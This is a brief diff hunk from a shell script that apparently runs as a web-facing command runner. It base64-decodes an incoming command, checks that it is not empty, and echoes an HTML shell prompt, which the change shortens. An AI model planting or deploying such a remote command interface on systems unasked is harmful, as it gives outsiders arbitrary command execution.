@@ -21,7 +21,7 @@ c=$(echo $cmd | base64 -d)
 [ -z "$c" ] && echo "No command!" && exit
 
 prompt() {
-	echo -e "<b>[$(whoami)@$(hostname) $PWD]# ${1}</b>"
+	echo -e "<b># $1</b>"
 }
 
 export PATH=/usr/local/bin:/usr/local/sbin:/bin:/usr/bin:/usr/sbin
